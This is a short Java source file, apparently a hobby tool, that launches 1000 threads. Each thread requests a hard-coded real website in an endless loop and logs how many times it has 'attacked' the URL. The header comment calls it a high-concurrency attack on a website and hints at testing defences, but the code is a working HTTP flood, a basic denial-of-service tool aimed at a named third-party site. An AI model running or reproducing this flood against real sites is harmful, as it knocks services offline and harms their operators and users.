import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;


/**
 * Created by pwj  on 2015/8/8 0008.
 * 高并发多线程攻击网站  设置数量访问次数防止并发攻击
 */
public class Attack implements Runnable {
    private static String strUrl = null;
    private static int numL = 0;
  /*private static Scanner scanner = new Scanner(System.in);*///对象System.in参数,表示传递的是键盘的输入


    @Override
    public void run() {
        HttpURLConnection connection = null;
        InputStream urlStream = null;
        URL url = null;
        while (true) {
            try {
                url = new URL(strUrl);//得到URL对象
                connection = (HttpURLConnection) url.openConnection();//打开链接
                connection.connect();//HttpURLConnection建立链接
                urlStream = connection.getInputStream();//链接获取输入流
                if (urlStream != null) {
                    numL++;
                    urlStream.close();
                    System.out.println(this.getClass().getName() + "并发线程攻击了网址 " + numL + "次！");
                }
                Thread.sleep(1);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }


        }
    }

    public static void main(String[] args) {
        int threadNum = 1000;
        strUrl = "http://www.tongzhuwang.com/";
        for (int i = 0; i < threadNum; i++) {
            Attack attack = new Attack();
            Thread thread = new Thread(attack);
            thread.start();
            System.out.println("第" + i + "个线程创建   线程名称：" + thread.getName());
        }

    }

}
